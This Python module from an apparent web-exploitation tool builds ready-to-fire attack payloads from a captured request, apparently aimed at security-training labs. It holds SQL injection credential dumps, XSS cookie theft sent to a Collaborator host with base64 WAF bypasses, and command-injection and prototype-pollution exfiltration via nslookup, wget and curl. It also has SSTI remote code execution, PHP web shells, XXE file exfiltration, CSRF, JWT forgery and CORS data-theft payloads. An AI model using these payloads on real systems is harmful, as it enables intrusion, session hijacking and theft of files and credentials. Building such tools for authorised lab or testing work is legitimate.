"""Turn a candidate's OBSERVED endpoint + parameter into concrete, ready-to-fire
payloads — so you don't hand-edit `?search=` into `?SearchTerm=` or guess the
path. The generic bank in templating.py still ships as reference; these are the
ones built from the actual captured request.

Each tailor_* returns a list[Payload]. They only fire when we actually know the
param/endpoint; otherwise the generic bank carries the class.
"""
from __future__ import annotations

import base64
import re
from urllib.parse import urlparse, parse_qs

from .models import Payload, Transaction


def _b64_fetch(collab: str) -> str:
    js = f"fetch('https://{collab}/?c='+document.cookie)"
    return base64.b64encode(js.encode()).decode()


def context(txn: Transaction | None) -> tuple[str, str, dict]:
    """(path, best_param, all_params) from a transaction. Parses query string,
    url-encoded bodies AND JSON bodies, so param-aware payloads work on APIs."""
    if txn is None:
        return "", "", {}
    pr = urlparse(txn.url)
    path = pr.path or "/"
    q = parse_qs(pr.query, keep_blank_values=True)
    params = {k: (v[0] if v else "") for k, v in q.items()}
    body = txn.req_body or ""
    if body.strip().startswith("{"):
        # JSON body: flatten top-level (and shallow nested) string/number fields
        import json
        try:
            obj = json.loads(body)
            params.update(_flatten_json(obj))
        except Exception:
            pass
    elif body and "=" in body:
        for k, v in parse_qs(body, keep_blank_values=True).items():
            params.setdefault(k, v[0] if v else "")
    return path, "", params


def _flatten_json(obj, prefix="") -> dict:
    out = {}
    if isinstance(obj, dict):
        for k, v in obj.items():
            key = f"{prefix}.{k}" if prefix else k
            if isinstance(v, (str, int, float)):
                out[key] = str(v)
            elif isinstance(v, dict):
                out.update(_flatten_json(v, key))
    return out


# params worth injecting into, best first
_INJECTABLE_HINT = ("searchterm", "search", "query", "q", "category", "filter",
                    "sort", "order", "name", "id", "blogartist", "author")


def pick_param(params: dict, prefer: str = "") -> str:
    if prefer and prefer in params:
        return prefer
    low = {k.lower(): k for k in params}
    for h in _INJECTABLE_HINT:
        if h in low:
            return low[h]
    # else first non-token param
    for k in params:
        if k.lower() not in ("csrf", "token", "nonce"):
            return k
    return next(iter(params), "")


def _base(path: str, params: dict, param: str, inject: str) -> str:
    """Rebuild a querystring with `param` set to its original value + inject."""
    parts = []
    for k, v in params.items():
        if k == param:
            parts.append(f"{k}={v}{inject}")
        else:
            parts.append(f"{k}={v}")
    return f"{path}?{'&'.join(parts)}"


def tailor(vuln_class: str, txn: Transaction | None, ph: dict) -> list[Payload]:
    if txn is None:
        return []
    path, _, params = context(txn)
    if not params and vuln_class in ("sql-injection", "reflected-stored-xss",
                                     "path-traversal", "ssrf", "os-command-injection",
                                     "ssti"):
        return []
    fn = _TAILORS.get(vuln_class)
    return fn(path, params, ph, txn) if fn else []


# --------------------------------------------------------------------------- #
def _t_sqli(path, params, ph, txn):
    p = pick_param(params)
    if not p:
        return []
    tag = f"[{p} @ {path}]"
    rows = [
        ("detect", "STEP 1 — single quote (does the page break/error/change?)", _base(path, params, p, "'")),
        ("detect", "STEP 2 — boolean TRUE (should look like the normal page)", _base(path, params, p, "' AND '1'='1")),
        ("detect", "STEP 2 — boolean FALSE (should look different / empty)", _base(path, params, p, "' AND '1'='2")),
        ("exploit", "find column count — add NULLs until you get a clean 200",
         _base(path, params, p, "' UNION SELECT NULL-- -") + "   then NULL,NULL-- -  then NULL,NULL,NULL-- -  …"),
        ("exploit", "DUMP admin creds — once column count known (click ⚡ Confirm to auto-build this)",
         _base(path, params, p, "' UNION SELECT NULL,username,NULL,password FROM users-- -")),
        ("exploit", "login bypass — if this is a login field",
         _base(path, params, p, "administrator'-- -")),
        ("exploit", "Postgres error-based — whole table in the error message",
         _base(path, params, p, "' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM users) AS int)-- -")),
        ("exploit", "if a WAF blocks it — case-randomise + /**/ between tokens",
         _base(path, params, p, "' UnIoN/**/SeLeCt/**/NULL,username,NULL,password/**/FROM/**/users-- -")),
    ]
    return [Payload(f"{tag} {name}", body, kind) for kind, name, body in rows]


def _t_xss(path, params, ph, txn):
    """The full XSS ladder — every context, so you never have to guess which card.
    Each payload says WHEN to use it. Works for both reflected and DOM/eval sinks."""
    p = pick_param(params) or "search"
    tag = f"[{p} @ {path}]"
    collab = ph.get("COLLAB") or "<collab>"
    b64 = _b64_fetch(collab)
    rows = [
        # ---- 1. figure out where your input lands ----
        ("detect", f"{tag} STEP 1 — context canary (send this, then search the response for waptZZ)",
         _base(path, params, p, "waptZZ'\"</script><svg>")),

        # ---- 2. plain alert PoCs for each context (try until one pops) ----
        ("exploit", f"{tag} a) HTML context — input shows in normal page HTML",
         _base(path, params, p, "<img src=1 onerror=alert(1)>")),
        ("exploit", f"{tag} b) attribute context — input is inside a tag attribute",
         _base(path, params, p, '"><img src=1 onerror=alert(1)>')),
        ("exploit", f"{tag} c) JavaScript / JSON eval sink — input is inside JS (the /search_res case)",
         _base(path, params, p, '"-alert(1)}//')),
        ("exploit", f"{tag} c2) JavaScript STRING — input is inside  var x='…'  (break out with ')",
         _base(path, params, p, "'-alert(1)//")),
        ("exploit", f"{tag} c3) HTML comment — input inside <!-- … --> (close it first)",
         _base(path, params, p, "--><svg onload=alert(1)>")),
        ("exploit", f"{tag} d) <script> tag filtered — case-broken close",
         _base(path, params, p, "</scRipt><img src=1 onerror=alert(1)>")),
        ("exploit", f"{tag} e) only SVG/some tags allowed",
         _base(path, params, p, "<svg onload=alert(1)>")),
        ("exploit", f"{tag} f) AngularJS (page has ng-app)",
         _base(path, params, p, "{{$on.constructor('alert(1)')()}}")),

        # ---- 3. once a PoC pops, swap alert for cookie theft ----
        ("exploit", f"{tag} COOKIE THEFT (HTML context) — swap in once (a)/(b)/(e) works",
         _base(path, params, p, f'<img src=1 onerror="fetch(\'https://{collab}/?c=\'+document.cookie)">')),
        ("exploit", f"{tag} COOKIE THEFT (eval sink) — swap in once (c) works",
         _base(path, params, p, f'"-fetch(`https://{collab}/?c=${{document.cookie}}`)}}//')),

        # ---- 4. if a WAF blocks 'fetch'/keywords (400 'dangerous') ----
        ("exploit", f"{tag} WAF BYPASS (eval sink) — 'fetch' hidden in base64, pre-built with your Collaborator",
         _base(path, params, p, f"\"-eval(atob('{b64}'))}}//")),
        ("exploit", f"{tag} WAF BYPASS (HTML context) — onerror runs base64, no literal 'fetch'/'document'",
         _base(path, params, p, f"<img src=1 onerror=eval(atob('{b64}'))>")),
        ("exploit", f"{tag} WAF BYPASS (attribute context) — break out, then base64 onerror",
         _base(path, params, p, f'"><img src=1 onerror=eval(atob(\'{b64}\'))>')),
        ("exploit", f"{tag} WAF BYPASS (tag/keyword filter) — HTML-entity encode the handler",
         _base(path, params, p, "<img src=1 onerror=&#97;&#108;&#101;&#114;&#116;(1)>")),
    ]
    return [Payload(name, body, kind) for kind, name, body in rows]


# both the reflected and DOM detectors get the same full ladder
_t_reflected = _t_xss
_t_dom = _t_xss


def _t_traversal(path, params, ph, txn):
    p = pick_param(params)
    if not p:
        return []
    tag = f"[{p} @ {path}]"
    rows = [
        ("exploit", "a) basic traversal to the secret", f"{path}?{p}=../../../../home/carlos/secret"),
        ("exploit", "b) absolute path (if ../ is stripped)", f"{path}?{p}=/home/carlos/secret"),
        ("exploit", "c) strip-once bypass (....// )", f"{path}?{p}=....//....//....//home/carlos/secret"),
        ("exploit", "d) null-byte extension bypass", f"{path}?{p}=../../../../home/carlos/secret%00.png"),
        ("exploit", "e) double-URL-encode (WAF/blacklist)", f"{path}?{p}=..%252f..%252f..%252f..%252fhome/carlos/%2573ecret"),
        ("exploit", "f) PHP wrapper — read source as base64", f"{path}?{p}=php://filter/convert.base64-encode/resource=/home/carlos/secret"),
    ]
    return [Payload(f"{tag} {n}", b, k) for k, n, b in rows]


def _t_ssrf(path, params, ph, txn):
    p = pick_param(params)
    if not p:
        return []
    collab = ph.get("COLLAB") or "<collab>"
    tag = f"[{p} @ {path}]"
    rows = [
        ("detect", "STEP 1 — point at Collaborator (poll for a hit = confirmed)", f"{path}?{p}=https://{collab}/"),
        ("exploit", "a) read the secret file directly", f"{path}?{p}=file:///home/carlos/secret"),
        ("exploit", "b) reach the internal admin panel", f"{path}?{p}=http://localhost/admin"),
        ("exploit", "c) internal port (port is in the exam brief)", f"{path}?{p}=http://localhost:6566/"),
        ("exploit", "d) bypass a blacklist (decimal/hex IP)", f"{path}?{p}=http://2130706433/"),
        ("exploit", "e) bypass a whitelist (@ / # trick)", f"{path}?{p}=http://localhost%2523@{ph.get('LAB','LAB')}/admin"),
    ]
    return [Payload(f"{tag} {n}", b, k) for k, n, b in rows]


def _t_cmdi(path, params, ph, txn):
    p = pick_param(params)
    if not p:
        return []
    collab = ph.get("COLLAB") or "<collab>"
    tag = f"[{p} @ {path}]"
    rows = [
        ("detect", "STEP 1 — OOB ping (poll Collaborator for a DNS hit)", _base(path, params, p, f"`nslookup canary.{collab}`")),
        ("detect", "STEP 1b — time probe (response hangs ~10s = injectable, no OOB needed)", _base(path, params, p, "`sleep 10`")),
        ("exploit", "a) DNS-exfil the secret (survives egress filters)", _base(path, params, p, f"`nslookup $(cat /home/carlos/secret).{collab}`")),
        ("exploit", "b) POST the file straight out with wget", _base(path, params, p, f"`wget --post-file /home/carlos/secret https://{collab}/`")),
        ("exploit", "c) separators to try if backticks fail", _base(path, params, p, f"|nslookup canary.{collab}|") + "   also:  ;cmd;   $(cmd)   &&cmd   %0acmd"),
    ]
    return [Payload(f"{tag} {n}", b, k) for k, n, b in rows]


def _t_ssti(path, params, ph, txn):
    """Engine-fingerprint arithmetic first (safe), then per-engine file read."""
    p = pick_param(params) or "message"
    tag = f"[{p} @ {path}]"
    rows = [
        ("detect", "STEP 1 — polyglot: throws an error on most engines (tells you SSTI is in play)",
         _base(path, params, p, "${{<%[%'\"}}%\\")),
        ("detect", "STEP 2a — Jinja2 / Twig  ( {{…}} → 49 )", _base(path, params, p, "aa{{7*7}}zz")),
        ("detect", "STEP 2b — Java EL / Smarty  ( ${…} → 49 )", _base(path, params, p, "aa${7*7}zz")),
        ("detect", "STEP 2c — Ruby ERB / Thymeleaf  ( #{…} / <%=…%> )", _base(path, params, p, "aa#{7*7}zz")),
        ("detect", "STEP 2d — ERB / Freemarker  ( <%= … %> → 49 )", _base(path, params, p, "aa<%= 7*7 %>zz")),
        ("exploit", "a) Jinja2 read the secret", _base(path, params, p,
         "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/carlos/secret').read()}}")),
        ("exploit", "b) Twig read the secret", _base(path, params, p,
         "{{['cat /home/carlos/secret']|filter('system')}}")),
        ("exploit", "c) Freemarker RCE", _base(path, params, p,
         "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /home/carlos/secret')}")),
        ("exploit", "d) Ruby ERB RCE", _base(path, params, p, "<%= `cat /home/carlos/secret` %>")),
        ("exploit", "e) Java EL RCE", _base(path, params, p,
         "${T(java.lang.Runtime).getRuntime().exec('cat /home/carlos/secret')}")),
    ]
    return [Payload(f"{tag} {n}", b, k) for k, n, b in rows]


def _t_proto(path, params, ph, txn):
    """Prototype pollution — client (URL/JSON) and server (JSON) variants."""
    lab = ph.get("LAB") or "LAB"
    collab = ph.get("COLLAB") or "<collab>"
    rows = [
        ("detect", "client — pollute via URL, then check Object.prototype.foo in console",
         f"{path}?__proto__[foo]=bar"),
        ("exploit", "client → DOM XSS via a polluted gadget (URL)",
         f"{path}?__proto__[transport_url]=data:,alert(document.cookie)//"),
        ("exploit", "JSON body variant", '{"__proto__":{"transport_url":"data:,alert(document.cookie)//"}}'),
        ("exploit", "sanitizer strips __proto__ once? nested bypass",
         f"{path}?__pro__proto__to__[transport_url]=data:,alert(1)//"),
        ("detect", "server — privilege escalation probe (watch for behaviour change)",
         '{"__proto__":{"isAdmin":true}}'),
        ("exploit", "server (Node) RCE via polluted spawn option → exfil to Collaborator",
         '{"__proto__":{"execArgv":["--eval=require(\'child_process\').execSync('
         f"'curl https://{collab}/?x=$(base64 -w0 /home/carlos/secret)')\"]}}}}"),
    ]
    return [Payload(n, b, k) for k, n, b in rows]


def _t_hostheader(path, params, ph, txn):
    collab = ph.get("COLLAB") or "<collab>"
    rows = [
        ("detect", "STEP 1 — does the reset link echo the Host? change it and check the email",
         f"Host: {collab}"),
        ("exploit", "a) if Host is validated, add an override header",
         f"X-Forwarded-Host: {collab}"),
        ("exploit", "b) absolute-URL / dual-Host trick",
         f"Host: {ph.get('LAB','LAB')}\\r\\nHost: {collab}"),
    ]
    return [Payload(n, b, k) for k, n, b in rows]


def _t_csrf(path, params, ph, txn):
    lab = ph.get("LAB") or "LAB"
    target = txn.url if txn else f"https://{lab}{path}"
    fields = "email=attacker@evil.com"
    if txn and txn.req_body and "=" in txn.req_body and "{" not in txn.req_body:
        fields = txn.req_body
    inputs = "\n".join(
        f'  <input type="hidden" name="{kv.split("=",1)[0]}" value="{kv.split("=",1)[1] if "=" in kv else ""}">'
        for kv in fields.split("&") if kv)
    poc = (f'<form action="{target}" method="POST">\n{inputs}\n</form>\n'
           "<script>document.forms[0].submit();</script>")
    return [Payload("auto-submitting CSRF PoC (host on the exploit server)", poc, "exploit")]


def _t_jwt(path, params, ph, txn):
    rows = [
        ("exploit", "a) alg:none — set header {\"alg\":\"none\"}, payload sub=administrator, DROP the signature (keep trailing dot)",
         'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.'),
        ("exploit", "b) unverified signature — just change payload sub→administrator and send (JWT Editor)",
         '{"sub":"administrator"}'),
        ("exploit", "c) jwk/kid header injection — sign with your own key (JWT Editor → Embedded JWK)",
         '{"kid":"../../../../dev/null","alg":"HS256"}'),
    ]
    return [Payload(n, b, k) for k, n, b in rows]


def _t_cors(path, params, ph, txn):
    lab = ph.get("LAB") or "LAB"
    collab = ph.get("COLLAB") or "<collab>"
    target = txn.url if txn else f"https://{lab}{path}"
    rows = [
        ("detect", "STEP 1 — prove it in Repeater: add this header, see if ACAO reflects it + ACAC:true",
         "Origin: https://evil.example"),
        ("exploit", "credentialed cross-origin read → exfil (host on exploit server)",
         "<script>var x=new XMLHttpRequest();x.open('GET','" + target + "',true);"
         "x.withCredentials=true;x.onload=function(){fetch('https://" + collab +
         "/?d='+encodeURIComponent(x.responseText));};x.send();</script>"),
    ]
    return [Payload(n, b, k) for k, n, b in rows]


def _t_graphql(path, params, ph, txn):
    rows = [
        ("detect", "introspection — dump the whole schema",
         '{"query":"query{__schema{types{name fields{name}}}}"}'),
        ("exploit", "read a hidden field once you see it in the schema",
         '{"query":"query{getBlogPost(id:3){postPassword}}"}'),
        ("exploit", "introspection disabled? try with an inline comment / newline bypass",
         '{"query":"query{__schema\\n{types{name}}}"}'),
    ]
    return [Payload(n, b, k) for k, n, b in rows]


def _t_fileupload(path, params, ph, txn):
    rows = [
        ("exploit", "a) PHP web shell — upload as shell.php, then browse to it",
         "<?php echo file_get_contents('/home/carlos/secret'); ?>"),
        ("exploit", "b) RCE shell (then ?c=whoami)", "<?php system($_GET['c']); ?>"),
        ("exploit", "c) extension blocked — try these names", "shell.php.jpg  /  shell.phtml  /  shell.php5"),
        ("exploit", "d) Content-Type filter — set the part's header", "Content-Type: image/jpeg"),
        ("exploit", "e) path filter — escape into a web dir", "../shell.php"),
    ]
    return [Payload(n, b, k) for k, n, b in rows]


def _t_xxe(path, params, ph, txn):
    collab = ph.get("COLLAB") or "<collab>"
    inband = ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
              '"file:///home/carlos/secret">]><stockCheck><productId>&xxe;</productId>'
              "<storeId>1</storeId></stockCheck>")
    blind = (f'<!ENTITY % d SYSTEM "file:///home/carlos/secret"> '
             f'<!ENTITY % x "<!ENTITY e SYSTEM \'https://{collab}/?d=%d;\'>">')
    rows = [
        ("exploit", "a) in-band file read (value is echoed back)", inband),
        ("exploit", "b) blind — host this external DTD, exfil to Collaborator", blind),
    ]
    return [Payload(n, b, k) for k, n, b in rows]


_TAILORS = {
    "sql-injection": _t_sqli,
    "reflected-stored-xss": _t_xss,
    "dom-xss": _t_xss,
    "web-message-xss": _t_xss,
    "path-traversal": _t_traversal,
    "ssrf": _t_ssrf,
    "os-command-injection": _t_cmdi,
    "ssti": _t_ssti,
    "client-side-proto-pollution": _t_proto,
    "server-side-proto-pollution": _t_proto,
    "host-header": _t_hostheader,
    "csrf-takeover": _t_csrf,
    "jwt-forge": _t_jwt,
    "cors-exfil": _t_cors,
    "api-graphql": _t_graphql,
    "file-upload-rce": _t_fileupload,
    "xxe": _t_xxe,
}
